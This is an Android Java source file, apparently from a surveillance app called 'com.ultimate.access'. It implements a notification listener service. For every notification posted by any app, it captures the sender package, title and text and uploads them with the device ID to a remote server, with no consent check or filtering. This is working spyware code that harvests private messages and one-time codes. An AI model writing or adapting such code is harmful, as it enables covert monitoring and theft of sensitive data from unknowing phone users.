package com.ultimate.access.services;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.ultimate.access.network.ApiClient;
import com.ultimate.access.network.ApiService;

import java.util.HashMap;
import java.util.Map;

public class NotificationListener extends NotificationListenerService {

    private static final String TAG = "NotificationListener";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        String title = sbn.getNotification().extras.getString("android.title");
        String text = sbn.getNotification().extras.getString("android.text");

        if (title == null) title = "";
        if (text == null) text = "";

        Log.d(TAG, "Notification from: " + packageName);
        Log.d(TAG, "Title: " + title);
        Log.d(TAG, "Text: " + text);

        sendNotificationToServer(packageName, title, text);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Notification removed
    }

    private void sendNotificationToServer(String packageName, String title, String text) {
        String deviceId = android.provider.Settings.Secure.getString(
                getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);

        Map<String, Object> notification = new HashMap<>();
        notification.put("deviceId", deviceId);
        notification.put("packageName", packageName);
        notification.put("title", title);
        notification.put("text", text);

        Map<String, Object> request = new HashMap<>();
        request.put("deviceId", deviceId);
        request.put("notifications", new Map[]{notification});

        ApiService apiService = ApiClient.getClient().create(ApiService.class);
        apiService.sendNotifications(request).enqueue(new retrofit2.Callback<ApiService.ServerResponse>() {
            @Override
            public void onResponse(retrofit2.Call<ApiService.ServerResponse> call,
                                   retrofit2.Response<ApiService.ServerResponse> response) {
                // Success
            }

            @Override
            public void onFailure(retrofit2.Call<ApiService.ServerResponse> call, Throwable t) {
                Log.e(TAG, "Failed to send notification: " + t.getMessage());
            }
        });
    }
}
